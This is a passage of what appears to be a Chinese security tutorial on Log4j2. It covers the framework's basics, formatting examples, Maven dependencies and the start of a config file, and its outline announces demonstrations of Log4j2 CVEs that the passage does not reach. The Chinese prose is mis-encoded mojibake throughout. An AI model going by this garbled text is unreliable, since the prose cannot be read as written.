timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>å¤§çº¦ 18 åˆ†é’Ÿ</span><meta property="timeRequired" content="PT18M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">æ­¤é¡µå†…å®¹<button type="button" class="print-button" title="æ‰“å°"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-apache-log4j2-ä»‹ç»">1. Apache Log4j2 ä»‹ç»</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_1-1-ä»€ä¹ˆæ˜¯log4j2">1.1 ä»€ä¹ˆæ˜¯Log4j2</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_1-2-log4j2çš„ç‰¹ç‚¹">1.2 Log4j2çš„ç‰¹ç‚¹</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_1-3-log4j2çš„ç®€å•ä½¿ç”¨">1.3 Log4j2çš„ç®€å•ä½¿ç”¨</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-éƒ¨åˆ†å†å²æ¼æ´æ¼”ç¤º">2. éƒ¨åˆ†å†å²æ¼æ´æ¼”ç¤º</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-1-log4j2-ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´-cve-2017-5645">2.1 Log4j2 ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-2-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-44228">2.2 Log4j2 JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-44228ï¼‰</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-45046">2.3 Log4j2 JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-45046ï¼‰</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_3-æ£€æµ‹ä¸é˜²å¾¡">3. æ£€æµ‹ä¸é˜²å¾¡</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_3-1-æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨">3.1 æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_3-2-åœ¨é‡åˆ©ç”¨æ¡ˆä¾‹">3.2 åœ¨é‡åˆ©ç”¨æ¡ˆä¾‹</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_3-3-æ¼æ´é˜²æŠ¤æ–¹æ³•">3.3 æ¼æ´é˜²æŠ¤æ–¹æ³•</a></li><!----><!--]--></ul></li><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h1 id="webä¸»æµåº”ç”¨æ¼æ´-log4j2" tabindex="-1"><a class="header-anchor" href="#webä¸»æµåº”ç”¨æ¼æ´-log4j2"><span>webä¸»æµåº”ç”¨æ¼æ´-Log4j2</span></a></h1><h2 id="_1-apache-log4j2-ä»‹ç»" tabindex="-1"><a class="header-anchor" href="#_1-apache-log4j2-ä»‹ç»"><span>1. Apache Log4j2 ä»‹ç»</span></a></h2><h3 id="_1-1-ä»€ä¹ˆæ˜¯log4j2" tabindex="-1"><a class="header-anchor" href="#_1-1-ä»€ä¹ˆæ˜¯log4j2"><span>1.1 ä»€ä¹ˆæ˜¯Log4j2</span></a></h3><p>åœ¨æ—¥å¸¸çš„å¼€å‘ï¼Œæµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ—¥å¿—è®°å½•äº†åº”ç”¨ï¼ŒæœåŠ¡è¿è¡Œè¿‡ç¨‹ä¸­çš„å…³é”®ä¿¡æ¯ï¼Œä»¥åŠå‡ºç°å¼‚å¸¸æ—¶çš„å †æ ˆï¼Œè¿™äº›ä¿¡æ¯å¸¸å¸¸ä½œä¸ºæŸ¥è¯¢ï¼Œå®šä½ï¼Œè§£å†³é—®é¢˜çš„å…³é”®ï¼Œå› æ­¤åœ¨ä»»ä½•ç³»ç»Ÿä¸­ï¼Œå¯¹æ—¥å¿—çš„ä½¿ç”¨å¾—å½“ï¼Œå°†æå¤§çš„æé«˜ç¨‹åºé—®é¢˜è§£å†³çš„æ•ˆç‡ã€‚</p><p>Apache Log4jæ˜¯ä¸€ä¸ªJava æ—¥å¿—æ¡†æ¶ï¼Œ æ—¨åœ¨ä¸ºåº”ç”¨ç¨‹åºæä¾›è®°å½•æ—¥å¿—çš„åŠŸèƒ½ã€‚ log4jå¤§ä½“å¯ä»¥åˆ†ä¸º2ä¸ªç‰ˆæœ¬ï¼š 1.xå’Œ2.x, 1.xå·²ç»ä¸å†ç»´æŠ¤ï¼Œç›®å‰ä¸»æµçš„åº”ç”¨ç‰ˆæœ¬æ˜¯2.x, 2.xä¹Ÿè¢«ç§°ä¸ºlog4j2ã€‚ä½¿ç”¨éå¸¸å¹¿æ³›ï¼Œè¢«å¤§é‡ä¼ä¸šå’Œç³»ç»Ÿæ‰€ä½¿ç”¨ï¼Œ</p><ul><li><p>Log4jçš„1.xç‰ˆæœ¬è™½ç„¶å·²ç»è¢«å¹¿æ³›ä½¿ç”¨äºå¾ˆå¤šåº”ç”¨ç¨‹åºä¸­ï¼Œä½†ç”±äºå‡ºç°å†…å­˜æ³„æ¼ç­‰bugï¼Œä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œä»¥åŠéœ€è¦ä½¿ç”¨è€ç‰ˆæœ¬çš„jdkç­‰åŠ£åŠ¿ï¼Œåœ¨2015å¹´8æœˆå·²ç»åœæ­¢ç»´æŠ¤ã€‚</p></li><li><p>SLF4Jï¼šSLF4Jæ˜¯ä¼—å¤šæ—¥å¿—ç³»ç»Ÿçš„å†…æ ¸ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£ï¼Œä¸æä¾›å…·ä½“å®ç°ï¼Œä¸æ˜¯å…·ä½“å¯ä½¿ç”¨å¯é…ç½®çš„æ—¥å¿—ç³»ç»Ÿã€‚</p></li><li><p>Logbackï¼šæä¾›äº†å¯¹SLF4Jå…·ä½“å®ç°çš„æ—¥å¿—ç³»ç»Ÿï¼Œç›¸æ¯”Log4j1.xï¼ŒLogbackçš„æ€§èƒ½ï¼Œä½¿ç”¨åœºæ™¯ï¼Œå†…å­˜ä½¿ç”¨ç­‰æ–¹é¢çš„ä¼˜åŒ–è¦è¿œè¿œå¼ºäºLog4j1.xã€‚</p></li><li><p>Log4j2ï¼šLog4j2è™½ç„¶åœ¨å„ä¸ªæ–¹é¢éƒ½ä¸logbackéå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯å´æä¾›äº†æ›´å¼ºçš„æ€§èƒ½å’Œå¹¶å‘æ€§ï¼Œä¸‹ä¸€ä»£å¼‚æ­¥loggerï¼Œæ˜“äºæ‹“å±•è‡ªå®šä¹‰éœ€æ±‚çš„æ¶æ„ï¼Œæ˜¯ç›®å‰ä½¿ç”¨ååˆ†å¹¿æ³›çš„æ—¥å¿—æ¡†æ¶ã€‚</p></li></ul><blockquote><p>å…³äºæ—¥å¿—è®°å½•æ¡†æ¶çš„ä¸€äº›åŸºç¡€ï¼š</p><p>1ã€å®šä¹‰æ ‡å‡†æ—¥å¿—æ¥å£çš„æ¡†æ¶ï¼Œå¦‚ï¼šCommons Loggingã€SLF4Jã€JCLï¼ˆJakarta Commons Loggingï¼‰ã€jboss-loggingï¼›</p><p>2ã€å®ç°æ ‡å‡†æ—¥å¿—æ¥å£å®šä¹‰çš„å…·ä½“å®ç°æ–¹æ¡ˆï¼Œå¦‚ï¼šLog4jï¼ŒLog4j2ï¼ŒLogbackï¼ŒJava Util Logging(Jul)ã€slf4j-simpleã€slf4j-nopã€‚</p><p>3ã€Logbackã€slf4j-simpleã€slf4j-nopç›´æ¥åŸç”Ÿå®ç°äº†slf4jçš„æ¥å£ï¼›</p><p>4ã€ Log4jã€Log4j2ã€Java Util Logging(Jul)æ²¡æœ‰ç›´æ¥å®ç°slf4jæ¥å£ï¼Œæ‰€ä»¥éœ€è¦å¯¹åº”çš„é€‚é…ç±»å°†SLF4Jæ¥å£å’Œå…·ä½“å®ç°ç±»è¿›è¡Œç»‘å®šï¼ˆä¹Ÿå°±æ˜¯è¯´é™¤äº†æ¥å£å’Œå®ç°ç±»ä¸¤ä¸ªä¾èµ–å¤–ï¼Œè¿˜éœ€è¦ä¸€ä¸ªæ¡¥æ¥åŒ…ç”¨äºå°†æ¥å£å’Œå®ç°è¿›è¡Œç»‘å®šï¼‰ã€‚</p></blockquote><p>log4j2 ç”±å››éƒ¨åˆ†æ„æˆï¼š</p><ul><li>Logger -- è´Ÿè´£æ•è·æ—¥å¿—è®°å½•ï¼Œå¹¶ä¼ é€’ç»™ Appenderï¼Œä»–æ˜¯æ—¥å¿—è¡Œä¸ºçš„å‘èµ·è€…ã€‚</li><li>Appender -- è´Ÿè´£å°†æ—¥å¿—äº‹ä»¶è¿›è¡Œåˆ†ç±»å¤„ç†ï¼Œå°†æ—¥å¿—å‘å¾€ä»–åº”è¯¥å»çš„ç›®æ ‡å»å‘ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç§°ä¸º Handlerã€‚</li><li>Layout -- Layout è´Ÿè´£åœ¨æ—¥å¿—è¾“å‡ºå‰å†³å®šæ—¥å¿—çš„æ ¼å¼ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç§°ä¸º Fomatterã€‚</li><li>Filter -- Filter æ˜¯å¯é€‰çš„ç»„ä»¶ï¼Œæ¯ä¸€ä¸ª Loggerã€Appender ç”šè‡³å…¨å±€éƒ½å¯ä»¥é…ç½®è‹¥å¹²ä¸ª Filterï¼Œæ¥å†³å®šç›¸åº”çš„ç»„ä»¶å¯¹å½“å‰çš„æ—¥å¿—æ—¶é—´æ˜¯å¦å…³å¿ƒã€‚</li></ul><h3 id="_1-2-log4j2çš„ç‰¹ç‚¹" tabindex="-1"><a class="header-anchor" href="#_1-2-log4j2çš„ç‰¹ç‚¹"><span>1.2 Log4j2çš„ç‰¹ç‚¹</span></a></h3><ul><li><p>è‡ªåŠ¨é‡æ–°åŠ è½½é…ç½®ï¼šå‚è€ƒäº†Logbackçš„è®¾è®¡ï¼Œæä¾›è‡ªåŠ¨åˆ·æ–°å‚æ•°é…ç½®ï¼Œæœ€å®ç”¨çš„å°±æ˜¯æˆ‘ä»¬åœ¨ç”Ÿäº§ä¸Šå¯ä»¥åŠ¨æ€çš„ä¿®æ”¹æ—¥å¿—çš„çº§åˆ«è€Œæ— éœ€é‡å¯åº”ç”¨</p></li><li><p>å¼‚å¸¸å¤„ç†ï¼šåœ¨logbackä¸­ï¼ŒAppenderä¸­çš„å¼‚å¸¸ä¸ä¼šè¢«åº”ç”¨æ„ŸçŸ¥åˆ°ï¼Œä½†æ˜¯åœ¨Log4j2ä¸­ï¼Œæä¾›äº†ä¸€äº›å¼‚å¸¸å¤„ç†æœºåˆ¶</p></li><li><p>æ€§èƒ½æå‡ï¼šlog4j2ç›¸è¾ƒäºlog4jå’Œlogbackéƒ½å…·æœ‰å¾ˆæ˜æ˜¾çš„æ€§èƒ½æå‡ï¼Œæ®å®˜æ–¹æµ‹è¯•ï¼Œå¼‚æ­¥è®°å½•å™¨çš„ååé‡æ¯”Log4j 1.x å’Œ Logbacké«˜18å€ï¼Œå»¶è¿Ÿä½</p></li><li><p>æ— åƒåœ¾æœºåˆ¶ï¼šï¼ˆé»˜è®¤å¼€å¯ï¼‰log4j2åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨æ— åƒåœ¾æœºåˆ¶ã€å¯¹è±¡é‡ç”¨ã€å†…å­˜ç¼“å†²ã€‘ï¼Œé¿å…é¢‘ç¹çš„æ—¥å¿—æ”¶é›†å¯¼è‡´çš„ jvm gc</p></li><li><p>æ’ä»¶æ¶æ„ï¼šLog4j2ä½¿ç”¨æ’ä»¶æ¨¡å¼é…ç½®ç»„ä»¶ã€‚å› ä¸ºæ— éœ€ç¼–å†™ä»£ç æ¥åˆ›å»ºå’Œé…ç½®Appenderã€Layoutã€Pattern Converyerç­‰ã€‚åœ¨é…ç½®äº†çš„æƒ…å†µä¸‹ï¼ŒLog4j2è‡ªåŠ¨è¯†åˆ«æ’ä»¶å¹¶ä½¿ç”¨ä»–ä»¬</p></li><li><p>é«˜çº§è¿‡æ»¤ï¼šä¸Logbackä¸€æ ·ï¼ŒLog4j2æ”¯æŒåŸºäºLogäº‹ä»¶ä¸­çš„ä¸Šä¸‹æ–‡æ•°æ®ï¼Œæ ‡è®°ï¼Œæ­£åˆ™è¡¨è¾¾å¼å’Œå…¶ä»–ç»„ä»¶è¿›è¡Œè¿‡æ»¤ã€‚æ­¤å¤–ï¼Œè¿‡æ»¤å™¨è¿˜å¯ä»¥ä¸è®°å½•å™¨å…³è”ã€‚ä¸Logbackä¸åŒï¼ŒLog4j2å¯ä»¥åœ¨ä»»ä½•è¿™äº›æƒ…å†µä¸‹ä½¿ç”¨é€šç”¨çš„Filterç±»</p></li><li><p>æ›´å¼ºå¤§çš„å‚æ•°æ ¼å¼åŒ–ï¼š</p><p>Log4jçš„APIä¸SLF4Jç›¸æ¯”ï¼Œæä¾›äº†æ›´ä¸°å¯Œçš„å‚æ•°æ ¼å¼åŒ–åŠŸèƒ½ã€‚ä½¿ç”¨ {} å ä½ç¬¦æ ¼å¼åŒ–å‚æ•°ã€‚ç”¨ {} çš„æ–¹å¼æ¥å®ç°â€œformatâ€çš„åŠŸèƒ½ï¼ˆå‚æ•°ä¼šç›´æ¥toStringæ›¿æ¢å ä½ç¬¦ï¼‰ï¼Œåƒä¸‹é¢è¿™æ ·ï¼š</p></li></ul><pre><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user {} with birthday {}&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>ä½¿ç”¨String.formatå½¢å¼æ ¼å¼åŒ–å‚æ•°ï¼šLog4j2 ä¸­é™¤äº†æ”¯æŒ {} çš„å‚æ•°å ä½ç¬¦ï¼Œè¿˜æ”¯æŒ String.format çš„å½¢å¼</p><pre><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getFormatterLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user %s with birthday %s&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user %1$s with birthday %2$tm %2$te,%2$tY&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Integer.MAX_VALUE = %,dã€Long.MAX_VALUE = %,d&quot;</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// æ³¨æ„ï¼šå¦‚æœæƒ³ä½¿ç”¨ String.format çš„å½¢å¼ï¼Œéœ€è¦ä½¿ç”¨ LogManager.getFormatterLogger è€Œä¸æ˜¯ LogManager.getLogger</span>
</code></pre><p>ä½¿ç”¨logger.printfæ ¼å¼åŒ–å‚æ•°ï¼šLog4j2çš„Loggeræ¥å£ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªlogger.printf()æ–¹æ³•ï¼Œæ— éœ€åˆ›å»º LogManager.getFormatterLoggerï¼Œå°±å¯ä»¥ä½¿ç”¨ String.format çš„å½¢å¼</p><pre><code class="language-java">
<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Level</span><span class="token punctuation">.</span><span class="token constant">INFO</span><span class="token punctuation">,</span> <span class="token string">&quot;Logging in user %1$s with birthday %2$tm %2$te,%2$tY&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Opening connection to {}...&quot;</span><span class="token punctuation">,</span> someDataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><h3 id="_1-3-log4j2çš„ç®€å•ä½¿ç”¨" tabindex="-1"><a class="header-anchor" href="#_1-3-log4j2çš„ç®€å•ä½¿ç”¨"><span>1.3 Log4j2çš„ç®€å•ä½¿ç”¨</span></a></h3><p><strong>ï¼ˆ1ï¼‰å¼•ç”¨ä¾èµ–</strong></p><p>åœ¨ä¸€èˆ¬é¡¹ç›®ä¸­ä½¿ç”¨Log4j2è‡³å°‘éœ€è¦å¼•ç”¨log4j-api-2.xå’Œlog4j-core-2.xè¿™ä¸¤ä¸ªjaråŒ…ã€‚</p><pre><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>åœ¨spring booté¡¹ç›®ä¸­ä½¿ç”¨Log4j2</p><pre><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- æ’é™¤spring booté»˜è®¤æ—¥å¿—logback --&gt;</span>
    <span class="token comment">&lt;!-- æ³¨æ„ï¼ï¼ï¼è¿™é‡Œå¿…é¡»æœ‰ --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-logging<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- å¼•å…¥log4j2ä¾èµ– --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-log4j2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><p><strong>ï¼ˆ2ï¼‰æ·»åŠ é…ç½®æ–‡ä»¶</strong></p><p>é…ç½®æ–‡ä»¶log4j2.xmlä¸€èˆ¬ç±»ä¼¼è¿™æ ·ï¼š</p><pre><code class="language-xml"><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>

<span class="token comment">&lt;!-- é…ç½®LoggerConfigï¼Œå³Appendersçš„æ—¥å¿—çº§åˆ«ä¸ºWARN --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>WARN<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>  
    <span class="token comment">&lt;!-- Appendersæ”¯æŒé…ç½®å¤šä¸ªAppenderï¼Œæ”¯æŒå‘ä¸åŒçš„ç›®æ ‡è¾“é€æ—¥å¿—ï¼Œæœ¬ä¾‹ä¸ºé…ç½®å‘æ§åˆ¶å°è¾“å‡º --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>SYSTEM_OUT<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5level %logger{0} - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Pattern</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PatternLayout</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">&gt;</span></span>
    
    <span class="token comment">&lt;!-- Loggersæ”¯æŒé…ç½®å¤šä¸ªLoggerï¼Œå¯å¼•ç”¨ä¸åŒçš„ç›®æ ‡Appenderï¼Œä¹Ÿå¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚å®šåˆ¶ç‰¹å®šè¦æ±‚çš„Appender --&gt;</span>
